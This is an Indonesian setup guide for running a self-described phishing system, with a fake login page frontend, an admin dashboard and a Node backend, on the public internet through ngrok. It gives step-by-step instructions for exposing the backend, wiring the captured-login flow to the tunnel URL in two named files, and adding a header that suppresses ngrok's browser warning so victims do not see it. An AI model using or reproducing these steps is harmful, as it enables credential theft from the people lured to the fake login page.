# Panduan Menghubungkan Frontend, Admin, dan Backend via Ngrok

Agar sistem phising ini berjalan lancar di internet menggunakan ngrok, kamu perlu memperbarui URL API di dua tempat utama.

### 1. Persiapan Backend
Pastikan backend berjalan di port **5000**.
- Buka terminal di folder `backend`.
- Jalankan: `npm start` atau `node index.js`.
- Jalankan ngrok: `ngrok http 5000`.
- Salin link HTTPS yang diberikan ngrok (contoh: `https://xxxx-xxxx.ngrok-free.dev`).

---

### 2. Lokasi Perubahan Link (Paste link Ngrok di sini)

#### **A. Untuk Frontend (Halaman Login)**
Buka file berikut dan ubah variabel `BACKEND_URL` di baris paling atas:
- **File:** `frontend/scripts/components/login_logic.js`
- **Baris:** 3
- **Kode:**
  ```javascript
  const BACKEND_URL = 'https://link-ngrok-kamu-disini.ngrok-free.dev';
  ```

#### **B. Untuk Dashboard Admin**
Buka file berikut dan ubah variabel `BACKEND_URL` di bagian script:
- **File:** `admin/index.html`
- **Baris:** 110
- **Kode:**
  ```javascript
  const BACKEND_URL = 'https://link-ngrok-kamu-disini.ngrok-free.dev';
  ```

---

### 3. Catatan Penting
- **Setiap kali ngrok diulang (restart)**, link-nya akan berubah (kecuali kamu pakai akun ngrok berbayar/static domain). Jadi kamu harus mengupdate kedua file di atas setiap kali mendapatkan link baru.
- Pastikan ada header `'ngrok-skip-browser-warning': 'true'` di setiap fetch (sudah terpasang di kode saat ini) agar tidak muncul halaman peringatan ngrok.
